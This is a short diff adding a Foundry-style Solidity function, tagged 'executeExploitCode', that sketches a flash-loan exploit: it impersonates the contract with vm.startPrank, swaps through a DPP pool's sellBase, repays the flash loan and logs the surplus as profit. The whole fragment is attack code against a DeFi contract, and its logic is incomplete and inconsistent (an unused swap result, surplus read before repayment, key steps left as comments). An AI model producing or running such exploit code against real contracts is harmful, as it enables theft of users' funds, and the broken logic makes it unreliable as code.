@@ -1,0 +1,28 @@
+```xml
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Setting the contract to prank the user (as the authorized user)
+    vm.startPrank(address(this), address(this));
+    
+    // Perform operations to exploit the contract
+    // For instance, sell a predetermined base amount to leverage the flash loan
+    uint256 baseAmount = amount; // Set this to the amount received from flash loan
+    uint256 quoteAmount;
+
+    // Calling the `sellBase` to swap base token for quote token
+    quoteAmount = IDPP(target).sellBase(address(this));
+
+    // Use the quote amount to perform further operations that could yield higher returns
+    // For example, use another swap to convert quote token back into base token or another desirable asset.
+
+    // Now transfer the surplus to repay the flash loan
+    uint256 surplus = IERC20(token).balanceOf(address(this));
+    IERC20(token).transfer(flashloanProvider, baseAmount);
+    
+    // The remaining will be profit or WETH accumulation
+    console.log("Surplus after operations: %s", surplus);
+    
+    vm.stopPrank();
+}
+</executeExploitCode>
+```
